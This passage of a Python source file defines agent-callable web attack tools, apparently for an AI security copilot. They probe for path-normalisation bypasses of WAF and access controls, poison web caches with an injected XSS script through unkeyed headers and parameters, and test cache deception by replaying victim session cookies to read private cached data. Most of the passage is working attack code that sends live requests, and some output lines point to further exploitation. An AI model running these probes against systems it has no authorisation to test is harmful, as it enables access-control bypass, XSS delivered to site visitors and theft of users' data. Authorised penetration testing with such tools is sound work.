        output.append("No second-order SQLi detected (checked time-based, error-based).")

    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 7. Path Normalisation Confusion
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def path_confusion_probe(url: str, protected_path: str = "/admin", options: str = "") -> str:
    """
    Test for path normalisation confusion that bypasses WAF rules or access controls.
    Probes: dot-segments, double-slash, URL encoding, Unicode normalisation,
    case variation, and null-byte injection.

    Args:
        url: Base URL (e.g. https://example.com)
        protected_path: Path to attempt to access (default: /admin)
        options: Extra options (unused)

    Returns:
        Path confusion findings
    """
    base = url.rstrip("/")
    output = [f"=== Path Normalisation Confusion: {base}{protected_path}", ""]
    findings = []

    # Get baseline for the protected path (expected 403/401/redirect)
    baseline = _get(base + protected_path)
    baseline_code = baseline.status_code if baseline else 0
    output.append(f"  Baseline {protected_path}: HTTP {baseline_code}")
    output.append("")

    # Build bypass candidates
    p = protected_path.lstrip("/")
    bypasses = [
        ("double-slash",        f"//{p}"),
        ("dot-segment-1",       f"/./{p}"),
        ("dot-segment-2",       f"/.//{p}"),
        ("dot-dot-slash",       f"/../{p}"),
        ("url-encoded-slash",   f"/%2f{p}"),
        ("double-url-encoded",  f"/%252f{p}"),
        ("case-variation",      f"/{p.upper()}"),
        ("null-byte",           f"/{p}%00"),
        ("semicolon",           f"/{p};/"),
        ("trailing-dot",        f"/{p}."),
        ("unicode-separator",   f"/\u0002{p}"),
        ("html-encoded-slash",  f"/&#x2f;{p}"),
        ("tab-encoded",         f"/{p}%09"),
    ]

    output.append("── Bypass Attempts ────────────────────────────")
    for label, path_variant in bypasses:
        probe_url = base + path_variant
        r = _get(probe_url)
        if r is None:
            output.append(f"  [{label}] No response")
            continue

        bypassed = (
            r.status_code == 200 and baseline_code in (401, 403)
        ) or (
            r.status_code < 400 and baseline_code >= 400
        )

        marker = "✓ BYPASS" if bypassed else f"HTTP {r.status_code}"
        output.append(f"  [{label}] {path_variant!r} → {marker}")

        if bypassed:
            findings.append(
                f"CRITICAL → WAF/access control bypassed via '{label}' "
                f"({path_variant}) — HTTP {r.status_code} "
                f"(baseline was {baseline_code})"
            )

    output.append("")
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("\nNext step: Use bypassed path for further exploitation.")
    else:
        output.append("No path normalisation bypasses found.")

    return "\n".join(output)


# ═══════════════════════════════════════════════════════════════════════════════
# WEB CACHE ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

@function_tool()
def cache_poisoning_probe(
    url: str,
    cookies: str = "",
    verify_rounds: int = 3,
) -> str:
    """
    Test for Web Cache Poisoning vulnerabilities.

    Injects payloads via unkeyed request headers and checks if the poisoned
    response is served to subsequent requests without the malicious header.

    Tests:
      - X-Forwarded-Host / X-Forwarded-Scheme injection
      - Fat GET (smuggling request body into cache key)
      - X-Original-URL / X-Rewrite-URL path override
      - Pragma / Cache-Control header manipulation
      - Parameter cloaking (parameter not in cache key)
      - Host header poisoning

    Args:
        url: Target URL to test
        cookies: Session cookies
        verify_rounds: Number of follow-up requests to detect cache hit (default: 3)

    Returns:
        Cache poisoning test results with confirmed vectors
    """
    out = [f"=== Web Cache Poisoning Probe: {url}", ""]
    hdrs = {**_DEFAULT_HEADERS, "Cache-Control": "no-cache"}
    if cookies:
        hdrs["Cookie"] = cookies

    import time as _time
    MARKER = "cybr-copilot-xss"
    XSS_VALUE = f"</title><script>alert('{MARKER}')</script>"

    def _is_poisoned(response_text: str) -> bool:
        return MARKER in (response_text or "")

    # ── Baseline ──────────────────────────────────────────────────────────────
    try:
        requests.get(url, headers=hdrs, timeout=_TIMEOUT, verify=False)
    except Exception as e:
        return f"Baseline error: {e}"

    findings = []
    out.append("── Unkeyed Header Tests ────────────────────────")

    # Each test: inject header, check if poisoned, then re-request without header
    header_tests = [
        ("X-Forwarded-Host", XSS_VALUE),
        ("X-Forwarded-Host", f"id.{XSS_VALUE}"),
        ("X-Forwarded-Scheme", f"https://{XSS_VALUE}"),
        ("X-Original-URL", f"/{XSS_VALUE}"),
        ("X-Rewrite-URL", f"/{XSS_VALUE}"),
        ("X-Host", XSS_VALUE),
        ("X-HTTP-Method-Override", "GET"),  # Body as cache key test
        ("Pragma", "akamai-x-get-cache-info"),
        ("X-Cache-Key", MARKER),
        ("X-Forwarded-For", "127.0.0.1"),  # Common unkeyed
    ]

    for header_name, header_value in header_tests:
        try:
            # Inject the payload
            inject_headers = {**hdrs, header_name: header_value,
                              "Cache-Control": "max-age=30"}
            r_poison = requests.get(url, headers=inject_headers,
                                    timeout=_TIMEOUT, verify=False)

            # Check if injection was reflected in poisoned response
            if _is_poisoned(r_poison.text):
                # Now verify it's cached: request without the malicious header
                _time.sleep(0.5)
                clean_headers = {**_DEFAULT_HEADERS}
                if cookies:
                    clean_headers["Cookie"] = cookies
                r_clean = requests.get(url, headers=clean_headers,
                                       timeout=_TIMEOUT, verify=False)
                if _is_poisoned(r_clean.text):
                    findings.append(
                        f"CRITICAL: Cache Poisoned via {header_name}!\n"
                        f"  Header  : {header_name}: {header_value[:60]}\n"
                        f"  Cached  : YES — marker found in clean follow-up request\n"
                        f"  Impact  : Stored XSS delivered to all cached visitors"
                    )
                    out.append(f"  [POISON + CACHE HIT] {header_name}: {header_value[:50]}")
                else:
                    findings.append(
                        f"HIGH: Injection reflected via {header_name} but not cached\n"
                        f"  Header  : {header_name}: {header_value[:60]}\n"
                        f"  Cached  : NO — requires specific cache conditions"
                    )
                    out.append(f"  [REFLECTION only] {header_name}: {header_value[:50]}")
            else:
                # Check if cache-related headers reveal info
                cache_header = r_poison.headers.get("X-Cache", "")
                cf_cache = r_poison.headers.get("CF-Cache-Status", "")
                age = r_poison.headers.get("Age", "")
                if cache_header or cf_cache or age:
                    out.append(f"  [cache info] {header_name} | X-Cache={cache_header} CF={cf_cache} Age={age}")
                else:
                    out.append(f"  [no effect] {header_name}")
        except Exception as e:
            out.append(f"  [error] {header_name}: {e}")

    # ── Parameter Cloaking ────────────────────────────────────────────────────
    out.append("")
    out.append("── Parameter Cloaking ──────────────────────────")
    # Inject XSS via parameter that may not be part of cache key
    cloak_params = [
        f"?callback={XSS_VALUE}",
        f"?jsonp={XSS_VALUE}",
        f"?utm_source={XSS_VALUE}",
        f"?x={XSS_VALUE}",
        f"#/../../{MARKER}",
    ]
    for param_suffix in cloak_params:
        try:
            r_test = requests.get(url + param_suffix, headers=hdrs,
                                  timeout=_TIMEOUT, verify=False)
            if _is_poisoned(r_test.text):
                out.append(f"  [REFLECTION] {param_suffix[:60]} — marker in response")
                findings.append(f"MEDIUM: Parameter reflection (cloaking candidate): {param_suffix[:60]}")
        except Exception:
            pass

    # ── Cache Headers Analysis ────────────────────────────────────────────────
    out.append("")
    out.append("── Cache Infrastructure Fingerprint ────────────")
    try:
        r = requests.get(url, headers={**_DEFAULT_HEADERS, "Pragma": "akamai-x-get-cache-info"},
                         timeout=_TIMEOUT, verify=False)
        for h in ["X-Cache", "CF-Cache-Status", "X-Varnish", "X-Squid-Error",
                  "X-Cache-Lookup", "Via", "Age", "X-CDN", "X-Served-By"]:
            v = r.headers.get(h, "")
            if v:
                out.append(f"  {h}: {v}")
                if h == "X-Cache" and "MISS" in v:
                    out.append("    → Cache MISS — good time to attempt poisoning")
                elif h == "X-Cache" and "HIT" in v:
                    out.append("    → Cache HIT — content being served from cache")
    except Exception as e:
        out.append(f"  Cache fingerprint error: {e}")

    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        for f in findings:
            out.append(f"🔴 {f}\n")
    else:
        out.append("No cache poisoning vectors confirmed")
        out.append("Consider: Burp Suite 'Param Miner' extension for comprehensive testing")

    return "\n".join(out)


@function_tool()
def cache_deception_probe(
    url: str,
    authenticated_path: str = "/profile",
    cookies: str = "",
    num_extensions: int = 8,
) -> str:
    """
    Test for Web Cache Deception vulnerabilities.

    Appends static file extensions (.css, .js, .jpg, etc.) to authenticated
    paths to trick the cache into storing and serving private responses publicly.

    Attack: GET /profile/nonexistent.css → cache stores it → attacker requests
    same URL without cookies → receives victim's cached profile data.

    Args:
        url: Base URL (e.g. https://target.com)
        authenticated_path: Authenticated endpoint to test (default: /profile)
        cookies: Victim session cookies to test with
        num_extensions: Number of extension variants to test (default: 8)

    Returns:
        Cache deception test results
    """
    out = ["=== Web Cache Deception Probe", f"  Target : {url}",
           f"  Path   : {authenticated_path}", ""]

    if not cookies:
        out.append("[!] No cookies provided — testing without authentication")
        out.append("    Provide victim cookies for accurate results\n")

    hdrs = {**_DEFAULT_HEADERS}
    if cookies:
        hdrs["Cookie"] = cookies

    extensions = [
        ".css", ".js", ".jpg", ".png", ".ico", ".gif", ".svg",
        ".woff", ".ttf", ".eot", ".pdf", ".xml"
    ][:num_extensions]

    path_suffixes = [
        "/",
        "/nonexistent",
        "/..;/",
        "%09",
        "%3b",
        "%23",
        "%3f.css",
    ]

    # Baseline: request the authenticated path normally
    base_fullurl = url.rstrip("/") + authenticated_path
    try:
        r_auth = requests.get(base_fullurl, headers=hdrs, timeout=_TIMEOUT, verify=False)
        auth_len = len(r_auth.text or "")
        auth_code = r_auth.status_code
        out.append(f"Baseline auth response: HTTP {auth_code}, len={auth_len}")
        # Extract sensitive-looking keys from JSON or HTML
        sensitive_patterns = [r'"email":', r'"user":', r'"username":', r'"name":',
                               r'"token":', r'"balance":', r'"ssn":']
        auth_has_sensitive = any(p.lower() in (r_auth.text or "").lower()
                                  for p in sensitive_patterns)
        if auth_has_sensitive:
            out.append("  → Authenticated response contains sensitive user data")
    except Exception as e:
        return f"Baseline auth request failed: {e}"

    findings = []
    out.append("")
    out.append("── Extension Suffix Tests ──────────────────────")

    for ext in extensions:
        for suffix in path_suffixes[:3]:
            test_path = authenticated_path + suffix + ext
            test_url = url.rstrip("/") + test_path
            try:
                # Request WITH victim cookies (simulating victim access — caches the response)
                r_victim = requests.get(test_url, headers=hdrs,
                                        timeout=_TIMEOUT, verify=False, allow_redirects=True)
                # Check cache headers
                cache_status = r_victim.headers.get("X-Cache", "") + \
                               r_victim.headers.get("CF-Cache-Status", "")
                age = r_victim.headers.get("Age", "")

                if r_victim.status_code == 200 and len(r_victim.text or "") > auth_len * 0.8:
                    # Server returned authenticated content for .css-appended path
                    # Now request WITHOUT cookies to see if cached
                    import time as _time2
                    _time2.sleep(0.3)
                    clean_hdrs = {**_DEFAULT_HEADERS}
                    r_unauth = requests.get(test_url, headers=clean_hdrs,
                                            timeout=_TIMEOUT, verify=False)
                    if r_unauth.status_code == 200 and auth_has_sensitive:
                        sensitive_in_unauth = any(
                            p.lower() in (r_unauth.text or "").lower()
                            for p in sensitive_patterns
                        )
                        if sensitive_in_unauth:
                            findings.append(
                                f"CRITICAL: Cache Deception Confirmed!\n"
                                f"  Path        : {test_path}\n"
                                f"  Victim URL  : {test_url}\n"
                                f"  Unauth code : HTTP {r_unauth.status_code}\n"
                                f"  Cached data contains sensitive user information"
                            )
                        elif len(r_unauth.text or "") > auth_len * 0.5:
                            findings.append(
                                f"HIGH: Likely Cache Deception — unauthenticated response resembles authenticated:\n"
                                f"  Path: {test_path}\n"
                                f"  Auth len={auth_len}, Unauth len={len(r_unauth.text or '')}"
                            )

                    out.append(f"  [200] {test_path} | X-Cache={cache_status[:20]} Age={age}")
                else:
                    out.append(f"  [{r_victim.status_code}] {test_path}")
            except Exception as e:
                out.append(f"  [error] {test_path}: {e}")

    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        for f in findings:
            out.append(f"🔴 {f}\n")
        out.append("Impact: Unauthenticated attackers can steal cached user data")
    else:
        out.append("No cache deception vectors confirmed")
        out.append("Tip: Try manually in Burp — some cache behaviors need browser simulation")

    return "\n".join(out)
